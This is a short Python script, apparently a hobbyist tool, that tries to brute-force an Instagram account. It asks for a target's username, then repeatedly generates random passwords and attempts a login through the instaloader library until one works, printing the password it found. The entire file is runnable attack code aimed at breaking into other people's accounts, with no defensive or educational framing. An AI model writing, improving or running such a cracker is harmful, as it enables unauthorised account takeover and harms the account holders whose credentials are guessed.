from password_generator import PasswordGenerator
import instaloader

def login(username, password):
    instagram = instaloader.Instaloader()
    try:
        instagram.login(user= username,passwd= password) # Trying to login.
        print("[+] Password Found Succesfully : " + password)
        return True
    except:
        print("[-] Password Incorrect : " + password) 
        return False

def instagram_password_cracker():
    username = input('Enetr account username: ') # Enter the username of the account whose password you want.
    print("")
    pwo = PasswordGenerator()
    pwo.excludeschars = "!%()$^&*+-/=?, _<>."
    while True:
        password = pwo.generate() # Generating password.
        response = login(username, password) # Trying to login.
        if(response):
            # You found the right password.
            # The end
            break
        # else: Try again.

# --- Start --- #
instagram_password_cracker()
